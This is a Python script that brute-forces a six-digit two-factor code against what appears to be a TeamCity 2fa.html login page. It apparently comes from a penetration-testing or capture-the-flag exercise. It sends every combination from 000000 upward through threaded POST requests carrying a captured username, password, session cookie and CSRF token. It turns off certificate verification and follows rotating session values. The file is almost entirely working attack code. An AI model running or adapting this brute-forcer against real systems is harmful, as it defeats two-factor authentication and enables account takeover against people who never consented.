# BruteForce6DigitOTP.py
# this is painfully slow...

import requests
import warnings
import time
from itertools import product
from concurrent.futures import ThreadPoolExecutor

# the user name and password were obtained by ethical hacking
# the url, sessionid , and token values by veiwing the webpage, Inspect value

username = ""
password = ""
target_url = "https://xxx/2fa.html"
tc_session_id = ""
tc_csrf_token = ""

found_otp = None
attempts = 0

# Suppress the warning about disabling certificate verification
warnings.simplefilter("ignore", category=requests.urllib3.exceptions.InsecureRequestWarning)

# Generate all possible 6-digit OTP combinations
otp_combinations = product(range(10), repeat=6)

# Brute force the OTP using multithreading

def attempt_login(otp_str):
    global found_otp, attempts, tc_session_id, tc_csrf_token

# this requires no modification for user name and password, gets them from above
    
    data = {
        "username": username,
        "password": password,
        "otp": otp_str
    }

    # the below values, from line 40 through 57; were obtained using Burp
    
    headers = {
        "Host": "",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Referer": "https://xxx.xxx/2fa.html",
        "X-Requested-With": "XMLHttpRequest",
        "X-Teamcity-Client": "Web UI",
        "X-Tc-Csrf-Token": tc_csrf_token,
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "",
        "Dnt": "1",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Gpc": "1",
        "Te": "trailers",
        "Cookie": f"TCSESSIONID={tc_session_id}; __test=1"
    }

    # the below code does not require any modification for Burp values
    
    response = requests.post(target_url, data=data, headers=headers, verify=False)

    attempts += 1
    print(f"Attempted OTP: {otp_str}")

    if response.status_code == 302:
        found_otp = otp_str
        print(f"Successful login with OTP: {otp_str}")
        return otp_str

    # Check if the session data has changed
    new_session_id = response.cookies.get("TCSESSIONID")
    new_token = response.headers.get("X-Tc-Csrf-Token")

    if new_session_id != tc_session_id:
        tc_session_id = new_session_id
        print(f"New TCSESSIONID detected: {tc_session_id}")

    if new_token != tc_csrf_token:
        tc_csrf_token = new_token
        print(f"New tc-csrf-token detected: {tc_csrf_token}")

    return None

start_time = time.time()

with ThreadPoolExecutor() as executor:
    # Submit login attempts for each OTP combination
    futures = [executor.submit(attempt_login, "".join(map(str, otp_tuple))) for otp_tuple in otp_combinations]

    # Retrieve the result from the first successful attempt
    for future in futures:
        result = future.result()
        if result:
            found_otp = result
            break

end_time = time.time()
elapsed_time = end_time - start_time

if found_otp:
    print(f"\nLast successful OTP: {found_otp}")
else:
    print("\nNo valid OTP found.")

print(f"\nTotal OTP combinations attempted: {attempts}")
print(f"Total elapsed time: {elapsed_time:.2f} seconds")

print("\nBrute force complete.")
